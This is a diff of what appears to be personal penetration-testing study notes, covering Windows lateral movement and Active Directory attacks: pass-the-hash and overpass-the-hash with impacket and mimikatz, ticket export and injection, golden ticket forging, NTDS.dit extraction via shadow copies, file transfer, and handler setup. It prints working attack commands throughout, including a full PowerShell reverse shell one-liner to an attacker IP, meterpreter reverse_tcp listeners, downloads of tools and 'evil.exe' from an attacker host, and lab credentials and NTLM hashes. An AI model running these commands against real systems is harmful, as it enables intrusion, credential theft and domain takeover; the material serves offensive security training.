@@ -3359,7 +3362,7 @@ $dcsesh = New-PSSession -Computer SANDBOXDC
 Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
 ```
 
-**PowerShell Remoting** by default uses **WinRM** for Cmdlets such as `Enter-PSSession`. => user needs to be in the local group **Windows Management Users**. However, instead of WinRM, **SSH** can also be used for PowerShell remoting.
+**PowerShell Remoting** by default uses **WinRM** for Cmdlets such as `Enter-PSSession` => user needs to be in the local group **Windows Management Users**. However, instead of WinRM, **SSH** can also be used for PowerShell remoting.
 
 Note that creating a PowerShell remoting session via WinRM in a **bind shell** can cause unexpected behavior.
 
@@ -3376,16 +3379,16 @@ evil-winrm -i 192.168.50.220 -u daveadmin -p "password"
 
 ## SysInternals PsExec
 
-* The user that authenticates to the target machine needs to be part of the Administrators local group
+* The user that authenticates to the target machine needs to be part of the **Administrators local group**
 * The `ADMIN$` share must be available
 * **File and Printer Sharing** has to be turned on. 
 
-The last two requirements are already met as they are the default settings on modern Windows Server systems.
+The last two requirements are the default settings on modern Windows Server systems.
 
-In order to execute the command remotely, PsExec:
-- Writes psexesvc.exe into the C:\Windows directory
+To execute the command remotely, PsExec:
+- Writes `psexesvc.exe` into the `C:\Windows` directory
 - Creates and spawns a service on the remote host
-- Runs the requested program/command as a child process of psexesvc.exe
+- Runs the requested program/command as a child process of `psexesvc.exe`
 
 ```pwsh
 ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
@@ -3393,22 +3396,24 @@ In order to execute the command remotely, PsExec:
 
 ## Pass the Hash
 
-This technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password.
+To authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password.
 
 Tools: PsExec from Metasploit, Passing-the-hash toolkit, and Impacket.
 
 Most tools that are built to abuse PtH can be leveraged to start a Windows service (e.g., cmd.exe or an instance of PowerShell) and communicate with it using **Named Pipes**. This is done using the **Service Control Manager** API.
 
-Unless we want to gain remote code execution, PtH does not need to create a Windows service for any other usage, such as accessing an SMB share.
+Unless we want to gain RCE, PtH does not need to create a Windows service for any other usage, such as accessing an SMB share.
 
-Similar to PsExec, this technique requires an SMB connection through the firewall (commonly port 445) and the Windows **File and Printer Sharing** feature to be enabled.
+Similar to PsExec, this technique requires an SMB connection through the firewall (commonly port **445**) and the Windows **File and Printer Sharing** feature to be enabled.
 
 This technique also requires the admin share called **ADMIN$** to be available and local administrative rights.
 
-This method works for Active Directory domain accounts and the built-in local **administrator** account. However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account.
+This method works for Active Directory **domain accounts** (need to be part of the **Administrators local group**) and the built-in local **administrator** account. However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account.
 
 ```bash
 /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
+impacket-wmiexec -hashes :369def79d8372408bf6e93364cc93075 corp/jen@192.168.146.73
 ```
 
 pth-toolkit
@@ -3419,12 +3424,12 @@ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f0
 
 ## Overpass the Hash
 
-With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).
+With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then obtain a Ticket Granting Service (TGS).
 
-In order to have a new PowerShell session that allows us to execute commands as jen
+To have a new PowerShell session to execute commands as jen (NTLM hash: 369def79d8372408bf6e93364cc93075)
 
 ```
-sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
 ```
 
 Generate a TGT by authenticating to a network share on the files04 server
@@ -3433,7 +3438,7 @@ Generate a TGT by authenticating to a network share on the files04 server
 net use \\files04
 ```
 
-Converted our NTLM hash into a Kerberos TGT -> use any tools that rely on Kerberos authentication such as the official PsExec application from Microsoft.
+Converted our NTLM hash into a Kerberos TGT -> use any tools that rely on Kerberos authentication such as the PsExec application from Microsoft.
 
 PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we may reuse the TGT to obtain code execution on the files04 host.
 
@@ -3443,26 +3448,26 @@ PsExec can run a command remotely but does not accept password hashes. Since we 
 
 ## Pass the Ticket
 
-This attack takes advantage of the TGS, which may be **exported** and re-injected elsewhere on the network and then used to authenticate to a specific service.
+TGS may be **exported** and re-injected elsewhere on the network and then used to authenticate to a specific service.
 
 If the service tickets belong to the current user, then no administrative privileges are required.
 
 E.g., To abuse an already existing session of dave. The dave user has privileged access to the backup folder located on WEB04 where our logged in user jen does not.
 
-Extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.
+Extract all the current TGT/TGS in memory which is then saved to disk in the **kirbi** mimikatz format.
 
 ```
 privilege::debug
 sekurlsa::tickets /export
 ```
 
-The above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the **kirbi** mimikatz format.
-
-Verify newly generated tickets with `dir`, filtering out on the **kirbi** extension
+Verify newly generated tickets, filtering out on the **kirbi** extension
 
 ```pwsh
 dir *.kirbi
 ```
+
+Inject dave's WEB04 TGS into our own session
 
 ```
 kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
@@ -3476,13 +3481,13 @@ ls \\web04\backup
 
 Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager.
 
-A collection of various DCOM lateral movement techniques: https://www.cybereason.com/blog/dcom-lateral-movement-techniques
+A collection of various DCOM lateral movement techniques: `https://www.cybereason.com/blog/dcom-lateral-movement-techniques`
 
 Microsoft Management Console (MMC) COM application is employed for scripted automation of Windows systems.
 
-The MMC Application Class allows the creation of Application Objects, which expose the **ExecuteShellCommand** method under the **Document.ActiveView** property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
+The MMC Application Class allows the creation of Application Objects, which expose the **ExecuteShellCommand** method under the **Document.ActiveView** property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for **local administrators**.
 
-Discover its available methods and objects using the Get-Member cmdlet
+Discover its available methods and objects using the `Get-Member` cmdlet
 
 The ExecuteShellCommand method accepts 4 parameters: Command, Directory, Parameters, and WindowState.
 
@@ -3518,7 +3523,7 @@ When a user submits a request for a TGT, the KDC encrypts the TGT with a secret 
 
 If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, aka golden tickets.
 
-Extract the password hash of the krbtgt account with Mimikatz
+Extract the **password hash of the krbtgt account** with Mimikatz
 
 ```
 privilege::debug
@@ -3527,17 +3532,18 @@ lsadump::lsa /patch
 
 While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources.
 
-E.g., we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins group, and the domain controller will trust it because it is correctly encrypted.
+E.g., Create a TGT stating that a non-privileged user is actually a member of the **Domain Admins** group, and the domain controller will trust it because it is correctly encrypted.
 
-Having obtained the NTLM hash of the krbtgt account, along with the domain SID, we can now forge and inject our golden ticket.
+Forge and inject our golden ticket:
 
-Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain.
+* NTLM hash of the krbtgt account
+* domain SID
 
-Before generating the golden ticket, we'll:
+Creating the golden ticket and injecting it into memory does **not require any administrative privileges** and can even be performed from a **computer that is not joined to the domain**.
+
 - Launch mimikatz and delete any existing Kerberos tickets with `kerberos::purge`.
-- Supply the domain SID (which we can gather with `whoami /user`) to the Mimikatz `kerberos::golden` command
-
-Use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash of the krbtgt user account. Starting July 2022, we'll need to provide an existing account, e.g., jen
+- Supply the domain SID (gather with `whoami /user`) to the Mimikatz `kerberos::golden` command
+- Starting July 2022, we'll need to provide an existing account, e.g., jen
 
 ```
 kerberos::purge
@@ -3555,11 +3561,11 @@ misc::cmd
 PsExec64.exe \\DC1 cmd.exe
 ```
 
-Note that If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked.
+Note that if we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked.
 
 ```bat
 psexec.exe \\192.168.50.70 cmd.exe
-...
+
 Access is denied.
 ```
 
@@ -3569,9 +3575,9 @@ A Shadow Copy, aka Volume Shadow Service (VSS) is a Microsoft backup technology 
 
 To manage volume shadow copies, the Microsoft signed binary `vshadow.exe` is offered as part of the Windows SDK.
 
-As **domain admins**, we have the ability to abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database `NTDS.dit` database file. Once we've obtained a copy of said database, we can extract every user credential offline on our local Kali machine.
+As **domain admins**, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database `NTDS.dit` database file. Then we can extract every user credential offline on our local Kali machine.
 
-Connect as the domain admin user to the DC1 domain controller and launch from an elevated prompt
+Connect as the domain admin user to the **domain controller** and launch from an elevated prompt
 
 * -nw: disable writers, which speeds up backup creation
 * -p: store the copy on disk
@@ -3609,12 +3615,10 @@ msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reve
 ```
 
 ```bash
-sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.11.0.4;set LPORT 80;run"
+msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.11.0.4;set LPORT 80;run"
 ```
 
 ## PowerShell
-
-Reverse Shells
 
 ```bat
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -3717,7 +3721,7 @@ scp cve-2017-16995.c joe@192.168.123.216:
 
 wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 
-axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
+axel -a -n 20 -o report_axel.pdf https://www.example.com/report.pdf
 ```
 
 ```pwsh
@@ -3839,10 +3843,13 @@ cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
 
 ```bash
 upx -9 nc.exe
+```
+
+```bash
 exe2hex -x nc.exe -p nc.cmd
 ```
 
-Copy and paste `nc.cmd` script into a shell on our Windows machine and run it, it will create a perfectly-working copy of our original nc.exe.
+Copy and paste `nc.cmd` script into a shell on our Windows machine and run it, it will create a perfectly-working copy of our original `nc.exe`.
 
 ## Windows Uploads Using Windows Scripting Languages
 
@@ -3930,8 +3937,8 @@ vimdiff scan-a.txt scan-b.txt
 ```
 
 ```bash
-nc <remote server's ip address> 80
-socat - TCP4:<remote server's ip address>:80
+nc <IP> 80
+socat - TCP4:<IP>:80
 
 sudo nc -lvp localhost 443
 sudo socat TCP4-LISTEN:443 STDOUT
@@ -4035,6 +4042,8 @@ cat filename.pub > authorized_keys
 
 Ignore any commands the user supplies with the command option in ssh. Prevent agent and X11 forwarding with the no-agent-forwarding and no-X11-forwarding options. Prevent the user from being allocated a tty device with the no-tty option. To allows the owner of the private key, to log in to our Kali machine but prevents them from running commands and only allows for port forwarding
 
+`authorized_keys`
+
 ```
 from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADA/IPHxsPg+fflPKW4N6pK0ZXS/ENC68Py+NhtW1c2So95ARwCa/H/d02iOWCLGEav2V1R9xk87xV/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
 ```
@@ -4048,7 +4057,7 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 
 Start cmd as user backupadmin
 
-```
+```bat
 runas /user:backupadmin cmd
 ```
 
@@ -4147,8 +4156,6 @@ busybox httpd -f -p 10000
 ```
 
 Simulate an admin user login: `powershell -ep Bypass -File admin_login.ps1`
-
-`admin_login.ps1`
 
 ```pwsh
 $username="admin"
